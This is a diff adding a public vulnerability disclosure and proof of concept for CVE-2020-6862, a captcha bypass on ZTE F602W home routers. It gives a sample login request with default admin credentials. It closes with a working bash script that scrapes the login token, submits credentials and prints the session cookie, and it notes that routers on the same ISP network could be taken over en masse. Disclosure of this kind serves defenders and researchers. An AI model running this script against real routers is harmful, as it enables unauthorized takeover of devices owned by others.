@@ -1,0 +1,81 @@
+# Exploit Title: ZTE Router F602W - Captcha Bypass 
+# Exploit Author: Hritik Vijay (@MrHritik)
+# Vendor Homepage: https://zte.com.cn
+# Reported: 2019-06-14
+# Version: F6x2W V6.0.10P2T2
+# Version: F6x2W V6.0.10P2T5 
+# Tested on: F602W 
+# CVE: CVE-2020-6862
+
+Background
+-----------
+Captcha is used to make sure the form is being filled by a real person
+than an automated script. This is a very popular safety measure and
+bypassing it could lead to potential compromise.
+
+Introduction
+------------
+While logging in to the affected device you are presented with a
+username, password and captcha field. Submitting the form results in an
+HTTP request being sent out to /checkValidateCode.gch to validate the
+captcha, if valid it goes on to really submit the login request. This
+can be easily bypassed as this is a client side verification. One can
+always ignore the response and proceed to forcefully submit the form via
+Javascript (via calling the subpageSubmit() method).
+A typical login request looks like this:
+
+POST / HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 101
+Connection: close
+Cookie: _TESTCOOKIESUPPORT=1
+Upgrade-Insecure-Requests: 1
+
+frashnum=&action=login&Frm_Logintoken=2&Username=admin&Password=admin&Validatecode=literally_anything
+
+Though, firing the same request twice fails with a text on the top
+saying "Error". This pretty much defeats our purpose. It turns out that
+on every login attempt, the parameter Frm_Logintoken gets incremented by
+one and is required to match the server side value. This can pretty
+easily be achieved by some pattern matching. Thus allowing any script
+to bypass the captcha and log in.
+
+Threat
+-------
+A captcha bypass can really help in bruteforcing the credentials but
+luckily the router limits the login trials to 3 attempts. In real
+world though, things are a bit different. 
+The affected ZTE router comes with a default password. Given that the 
+devices on a same ISP network can access each other, it would be a 
+matter of time before someone writes a script to log in to every router 
+in the network and take control of it.
+
+PoC
+-------
+
+#!/bin/bash
+
+SERVER=192.168.1.1
+USER="admin"
+PASS="admin"
+
+getToken(){
+	curl -s  --cookie ' _TESTCOOKIESUPPORT=1; PATH=/;' $SERVER | grep 'Frm_Logintoken")' | cut -d\" -f4
+}
+
+Frm_Logintoken=`getToken`
+
+s=$(curl -sv --data "frashnum=&action=login&Frm_Logintoken=$Frm_Logintoken&Username=$USER&Password=$PASS" --cookie ' _TESTCOOKIESUPPORT=1; PATH=/;' $SERVER -w "%{http_code}" -o /dev/null 2> /tmp/zte_cookie)
+if [[ $s -eq 302 ]]; then
+	echo "Logged in"
+	echo "Open http://$SERVER/start.ghtml"
+	echo `grep -o Set-Cookie.* /tmp/zte_cookie`
+else
+	echo "Failed"
+fi
